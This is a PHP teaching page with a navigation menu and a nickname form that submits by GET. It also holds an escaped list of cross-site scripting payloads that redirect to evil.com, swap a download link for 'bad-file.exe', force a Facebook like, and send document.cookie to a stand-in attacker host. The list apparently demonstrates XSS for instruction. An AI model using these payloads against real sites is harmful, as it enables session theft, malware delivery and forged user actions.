<?php
require_once('controller/main.php'); // or include 'userService.php';  or require 'userService.php';

$current_page = $_SERVER['PHP_SELF'];

$pages = [
    ['name' => 'Home', 'url' => 'index.html'],
    ['name' => 'Intro PHP', 'url' => 'intro.php'],
    ['name' => 'About PHP', 'url' => 'about.php'],
    ['name' => 'Login', 'url' => 'login.php'],
    ['name' => 'fruit-finder', 'url' => 'fruit-finder.html'],
];

?>

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Hi PHP</title>
</head>

<body>
    <!-- nav -->
    <nav>
        <?php
        foreach ($pages as $page) {
            if ($page['url'] !== $current_page) {
                echo '<a href="' . $page['url'] . '">' . $page['name'] . ' | ' . '</a>';
            }
        }
        ?>
    </nav>
    <h1>Hi PHP</h1>
    <h2>Lets Meet PHP</h2>

    <form action="login.php" method="get">
        <input name="nickname" type="text" placeholder="Your nickname" style="width:80%" />
        <button>Go</button>
    </form>



    <pre>
        &lt;script>alert('Go Away') &lt;/script>
        &lt;script>window.location="http://evil.com" &lt;/script>
        &lt;script>window.location="http://bankpokalim.com" &lt;/script>
        &lt;script>theLink.href="http://evil.com/bad-file.exe" &lt;/script>
        &lt;script>setTimeout(()=>{document.querySelector('#theLink').href="http://evil.com/bad-file.exe"}, 1000) &lt;/script>
        &lt;script>console.log('Cookies:', document.cookie) &lt;/script>
        &lt;script>setTimeout(()=>{imgEvil.src = 'http://evil.cox/api/steel?stolen=' + document.cookie}, 1000) &lt;/script>
        &lt;script> window.location = 'https://www.facebook.com/api/addLike?postId=17671'   &lt;/script>
    </pre>

    <button onclick="get_cars()">Get Cars</button>

</body>

</html>